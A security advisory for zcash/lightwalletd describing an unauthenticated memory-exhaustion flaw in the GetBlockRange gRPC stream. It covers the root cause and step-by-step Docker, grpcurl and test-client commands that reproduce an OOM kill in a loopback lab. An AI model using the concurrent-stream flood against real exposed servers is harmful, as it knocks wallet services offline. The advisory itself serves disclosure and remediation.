# GHSA-xq7v-jj38-pcwr: Unauthenticated concurrent GetBlockRange streams can OOM-terminate lightwalletd

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-xq7v-jj38-pcwr |
| CVE | none assigned |
| Severity | high |
| CWE | n/a |
| Published | 2026-10-27T19:57:28Z |
| Updated | 2026-10-27T19:57:28Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.0 (patched: 0.6.1) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-xq7v-jj38-pcwr |

## Description (verbatim)

An unauthenticated client can open many concurrent `GetBlockRange` gRPC streams and request large block spans. The server does not enforce a server-wide stream budget or a maximum span, so it performs enough concurrent work to exhaust available memory. In an isolated Docker test with a 256 MiB memory limit, the request burst caused lightwalletd v0.5.4 to be killed by the container OOM mechanism with `exit=137` and `oom=true`.

## Affected Version and Preconditions

- Repository: `https://github.com/zcash/lightwalletd`
- Commit: `09593edbee4ee68d47e5a53f8ce1c83514c4e8e6`
- Version: `v0.5.4`
- Minimum privilege: Unauthenticated network access to the gRPC listener
- Victim interaction: None
- Default configuration: No. The executable defaults to `127.0.0.1:9067`; a remote attacker requires an operator to expose the gRPC listener.
- Transport security: TLS does not prevent the attack because the RPC has no application-level client authorization. The deterministic reproduction uses plaintext only inside an isolated loopback lab.
- Tested resource limit: The OOM result was demonstrated with a 256 MiB Docker memory and swap limit.
- Backend condition: The deterministic reproduction uses the test-only Darkside backend with 600 synthetic blocks. Production-mode reproduction against a normal or mocked backend remains to be preserved.

## Root Cause

The source-to-sink path at the tested commit is:

1. An unauthenticated client supplies `BlockRange.start` and `BlockRange.end` to `lwdStreamer.GetBlockRange` in `frontend/service.go:279`.
2. The handler checks only that both endpoints are present. It does not cap the range length or acquire a server-wide work permit.
3. Each accepted stream starts `common.GetBlockRange` in a new goroutine at `frontend/service.go:288`.
4. `common.GetBlockRange` iterates the complete inclusive range at `common/common.go:626-683`, loads each compact block, and sends it through the stream.
5. Both TLS and plaintext server construction call `grpc.NewServer` without `grpc.MaxConcurrentStreams` at `cmd/root.go:144-181`. There is also no global semaphore limiting concurrent block-range work across connections.
6. Concurrent streams therefore multiply goroutines, block retrieval, serialization, transport work, CPU use, and memory consumption until an environmental resource limit is reached.

Context cancellation prevents the previously fixed cancelled-stream goroutine leak, but it does not bound the amount of valid concurrent work requested by clients that continue reading responses.

## Steps to Reproduce

Run these commands only in an isolated local environment. The published port is restricted to loopback. The commands below start from a clean checkout rather than invoking an internal function directly.

1. Check out and build the tested revision:

```bash
git clone https://github.com/zcash/lightwalletd.git lwd-0001-repro
cd lwd-0001-repro
git checkout 09593edbee4ee68d47e5a53f8ce1c83514c4e8e6
docker build -t lwd-0001-repro:09593edb .
```

2. Start lightwalletd with a 256 MiB memory and swap limit:

```bash
docker run -d \
  --name lwd-0001-positive \
  --memory 256m \
  --memory-swap 256m \
  -p 127.0.0.1:9067:9067 \
  lwd-0001-repro:09593edb \
  --darkside-very-insecure \
  --darkside-timeout 120 \
  --no-tls-very-insecure \
  --grpc-bind-addr 0.0.0.0:9067 \
  --http-bind-addr 127.0.0.1:9068 \
  --log-file /dev/stdout
```

3. After the listener starts, use `grpcurl` to create and activate 600 harmless synthetic blocks:

```bash
grpcurl -plaintext \
  -d '{"saplingActivation":1,"branchID":"bad","chainName":"x"}' \
  127.0.0.1:9067 \
  cash.z.wallet.sdk.rpc.DarksideStreamer/Reset

grpcurl -plaintext \
  -d '{"height":1,"count":600,"nonce":1}' \
  127.0.0.1:9067 \
  cash.z.wallet.sdk.rpc.DarksideStreamer/StageBlocksCreate

grpcurl -plaintext \
  -d '{"height":600}' \
  127.0.0.1:9067 \
  cash.z.wallet.sdk.rpc.DarksideStreamer/ApplyStaged
```

4. Record the baseline and build the repository's included stress client:

```bash
docker stats --no-stream lwd-0001-positive
lwd_client_dir=$(mktemp -d)
go build -o "$lwd_client_dir/testclient" ./testclient
```

The observed idle baseline was approximately 13.6 MiB in the 256 MiB container.

5. Open 16 client connections with 100 concurrent `GetBlockRange(1, 590)` streams per connection:

```bash
for lwd_client_number in {1..16}; do
  "$lwd_client_dir/testclient" \
    -op getblockrange \
    -concurrency 100 \
    -iterations 1 \
    1 590 \
    >"$lwd_client_dir/client-$lwd_client_number.log" 2>&1 &
done
wait || true
```

6. Inspect the container state:

```bash
docker inspect lwd-0001-positive \
  --format 'status={{.State.Status}} exit={{.State.ExitCode}} oom={{.State.OOMKilled}}'
```

The demonstrated marker is:

```text
status=exited exit=137 oom=true
```

The original positive run served 38,202 compact blocks across 1,618 streams in 365 ms before the OOM kill. A later adversarial re-run also ended with `exit=137` and `oom=true`.

7. Run the negative control. Remove the exited positive container, start a fresh identically limited container, stage the same 600 synthetic blocks using step 3, and do not run the concurrent client:

```bash
docker container rm lwd-0001-positive

docker run -d \
  --name lwd-0001-control \
  --memory 256m \
  --memory-swap 256m \
  -p 127.0.0.1:9067:9067 \
  lwd-0001-repro:09593edb \
  --darkside-very-insecure \
  --darkside-timeout 120 \
  --no-tls-very-insecure \
  --grpc-bind-addr 0.0.0.0:9067 \
  --http-bind-addr 127.0.0.1:9068 \
  --log-file /dev/stdout

sleep 60
docker stats --no-stream lwd-0001-control
docker inspect lwd-0001-control \
  --format 'status={{.State.Status}} exit={{.State.ExitCode}} oom={{.State.OOMKilled}}'
```

The demonstrated negative-control marker after staging and 60 seconds of idle time was `status=running` and `oom=false`, with memory remaining near 13 MiB.

8. Clean up the task-owned resources:

```bash
docker container stop lwd-0001-control
docker container rm lwd-0001-control
docker image rm lwd-0001-repro:09593edb
rm -r "$lwd_client_dir"
cd ..
rm -r lwd-0001-repro
```

## Security Impact

The demonstrated impact is unauthenticated service unavailability. A client that can reach an exposed lightwalletd gRPC listener can force enough concurrent valid block-range work to exhaust a constrained deployment's memory and terminate the process. The service remains unavailable until a supervisor or operator restarts it.

This report rates the issue High using `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` for a score of 7.5. Network reachability is deployment-dependent because the executable binds to loopback by default. Availability is High for the demonstrated constrained process because the operating system terminated it, but there was no demonstrated data corruption, host compromise, or permanent node halt.

Sustained host tests also showed resource amplification without an imposed 256 MiB cap: 2,000 concurrent streams increased RSS from 84,352 KB to 252,864 KB, and a longer multi-connection run reached an 802 MB peak from a 25.5 MB baseline. Those measurements support the unbounded-resource primitive but do not establish that every production deployment will OOM at the same request count.

